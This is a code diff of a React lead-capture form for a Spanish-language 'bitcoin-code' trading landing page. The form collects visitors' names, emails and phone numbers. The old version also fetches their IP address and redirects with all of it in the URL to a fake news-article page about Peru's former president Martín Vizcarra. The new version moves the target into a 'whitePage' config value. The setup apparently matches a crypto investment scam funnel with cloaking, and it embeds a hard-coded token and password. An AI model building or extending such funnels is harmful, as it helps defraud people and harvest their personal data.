@@ -1,90 +1,39 @@
 import "./form.css";
-import axios from "axios";
-import { useState, useEffect, CSSProperties } from "react";
-
-import swal from 'sweetalert';
-import { sendLead, isValidUrl } from "./service";
-
+import { useState } from "react";
 import PropagateLoader from "react-spinners/PropagateLoader";
+import { phonecode, country, landing, idpass, whitePage } from "../../config";
+
 const override = {
   display: "block",
   margin: "0 auto",
   borderColor: "red",
 };
+
 export const Form = () => {
   const [name, setName] = useState("");
   const [lastName, setLastName] = useState("");
   const [email, setEmail] = useState("");
   const [phoneNumber, setPhoneNumber] = useState("");
-  const [ipAddress, setIPAddress] = useState("");
   const [loading, setLoading] = useState(false);
   const [errorMessage, setErrorMessage] = useState(false);
 
-  useEffect(() => {
-    const fetchIPAddress = async () => {
-      try {
-        const response = await axios.get("https://api.ipify.org?format=json");
-        setIPAddress(response.data.ip);
-        console.log(response.data.ip);
-      } catch (error) {
-        console.log("Error fetching IP address:", error);
-      }
-    };
-
-    fetchIPAddress();
-  }, []);
-
   const handleSubmit = async (e) => {
-    e.preventDefault();
-    // if (!name || !lastName || !email || !phoneNumber || !ipAddress) {
-    //   setErrorMessage("por favor complete todos los campos");
-    //   return;
-    // }
-    setLoading(true);
-
-    console.log({ name, lastName, email, phoneNumber, ipAddress });
-    const url =
-      window.location.origin +
-      window.location.pathname +
-      window.location.search;
-
-    let data = {
-      first_name: name,
-      last_name: lastName,
-      email: email,
-      phone: phoneNumber.replace(/\s/g, ""),
-      ip: ipAddress,
-      url: url,
-      token: "9e4f669c32cdc317998cb41e5375cffb",
-    };
-
-    const params = {
-      idnombre: data.first_name,
-      idapellidos: data.last_name,
-      idphone: data.phone,
-      idcorreo: data.email,
-      phonecode: '51',
-      country: 'PE',
-      source: `${window.location.href}`,
-      landing: "bitcoin-code"
-    };
-
     try {
-
-      // if (window.location.search.includes("aff_sub")) {
-        const url = window.location.href.replace(`${window.location.origin}/bitcoin-code`, "https://www.martinviz.com/article/martin-vizcarra-asegura-dejar-la-presidencia-de-peru-con-la-frente-en-alto/thanku");
-        const urlRedirect = `${url}&idpass=123qwe321&idnombre=${params.idnombre}&idapellidos=${params.idapellidos}&idphone=${params.idphone}&idcorreo=${params.idcorreo}&phonecode=${params.phonecode}&country=${params.country}&source=${window.location.host}&landing=${params.landing}`;
-        window.location.href = urlRedirect;
-      // } else {
-    
-      //   setName("");
-      //   setLastName("");
-      //   setEmail("");
-      //   setPhoneNumber("");
-      //   setErrorMessage("");
-      //   setLoading(false);
-      // }  
-      
+      e.preventDefault();
+      setLoading(true);
+      const params = {
+        idnombre: name,
+        idapellidos: lastName,
+        idphone: phoneNumber.replace(/\s/g, ""),
+        idcorreo: email,
+        phonecode: phonecode,
+        country: country,
+        source: `${window.location.href}`,
+        landing: landing,
+      };
+      const url = window.location.href.replace(`${window.location.origin}/${landing}`,whitePage);
+      const urlRedirect = `${url}&idpass=${idpass}&idnombre=${params.idnombre}&idapellidos=${params.idapellidos}&idphone=${params.idphone}&idcorreo=${params.idcorreo}&phonecode=${params.phonecode}&country=${params.country}&source=${window.location.host}&landing=${params.landing}`;
+      window.location.href = urlRedirect;
     } catch (error) {
       setLoading(false);
       setName("");
@@ -92,7 +41,9 @@ export const Form = () => {
       setEmail("");
       setPhoneNumber("");
       console.log(error.message);
-      setErrorMessage("por favor ingrese un correo electrónico y un número de teléfono válidos");
+      setErrorMessage(
+        "por favor ingrese un correo electrónico y un número de teléfono válidos"
+      );
     }
   };
 
@@ -139,7 +90,16 @@ export const Form = () => {
               onChange={(e) => setPhoneNumber(e.target.value)}
             />
           </div>
-          <p style={{ "margin-bottom": "5px" , "color":"red" , "fontSize" : "12px" , "text-align":"center" }}>{errorMessage}</p>
+          <p
+            style={{
+              "margin-bottom": "5px",
+              color: "red",
+              fontSize: "12px",
+              "text-align": "center",
+            }}
+          >
+            {errorMessage}
+          </p>
           <button type="submit" className="button-submit">
             {" "}
             COMIENCE A OPERAR
